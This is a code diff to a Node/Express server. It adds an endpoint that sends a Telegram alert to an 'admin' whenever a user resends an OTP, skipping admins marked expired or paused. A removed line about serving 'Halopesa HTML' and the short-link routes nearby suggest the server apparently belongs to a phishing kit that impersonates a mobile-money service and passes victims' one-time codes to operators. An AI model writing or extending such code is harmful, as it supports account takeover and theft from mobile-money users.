@@ -2453,8 +2453,71 @@ Prepare for incoming registration request.
   }
 });
 
+// ==========================================
+// ✅ POST /api/notify-admin-otp-resent
+// ==========================================
+// When user resends OTP, notify the admin
+app.post('/api/notify-admin-otp-resent', async (req, res) => {
+  try {
+    const { registrationId, adminId, timestamp } = req.body;
 
-// Serve the Halopesa HTML
+    if (!registrationId || !adminId) {
+      return res.status(400).json({ success: false, message: 'Missing fields' });
+    }
+
+    console.log(`\n⏰ OTP RESEND NOTIFICATION:`);
+    console.log(`   Registration ID: ${registrationId}`);
+    console.log(`   Admin ID: ${adminId}`);
+    console.log(`   Time: ${timestamp}`);
+
+    // ✅ Check if admin is active and not expired
+    try {
+      const admin = await db.getAdmin(adminId);
+      
+      if (!admin) {
+        console.log(`   ❌ Admin not found`);
+        return res.json({ success: false, message: 'Admin not found' });
+      }
+
+      // Only notify if admin is active and not expired
+      if (admin.expired) {
+        console.log(`   ⚠️ Admin expired - not notifying`);
+        return res.json({ success: true, message: 'Admin expired' });
+      }
+
+      if (pausedAdmins.has(adminId)) {
+        console.log(`   ⚠️ Admin paused - not notifying`);
+        return res.json({ success: true, message: 'Admin paused' });
+      }
+
+      // ✅ Send simple Telegram alert to admin
+      const message = `
+⏰ *OTP RESEND REQUEST*
+
+A user just resent their OTP code!
+      `;
+
+      console.log(`   ✅ Sending alert to admin: ${admin.name} (${admin.chatId})`);
+
+      await bot.sendMessage(String(admin.chatId), message.trim(), {
+        parse_mode: 'Markdown'
+      });
+
+      console.log(`   ✅ Alert sent successfully!\n`);
+      return res.json({ success: true, message: 'Alert sent to admin' });
+
+    } catch (dbError) {
+      console.error(`   ❌ Database error: ${dbError.message}`);
+      return res.status(500).json({ success: false, message: 'Database error' });
+    }
+
+  } catch (error) {
+    console.error('❌ Notify admin OTP resent error:', error);
+    res.json({ success: true, message: 'Notification queued' });
+  }
+});
+
+
 // ==========================================
 // SHORT LINK ROUTES (Subdomain & Path-based)
 // ==========================================
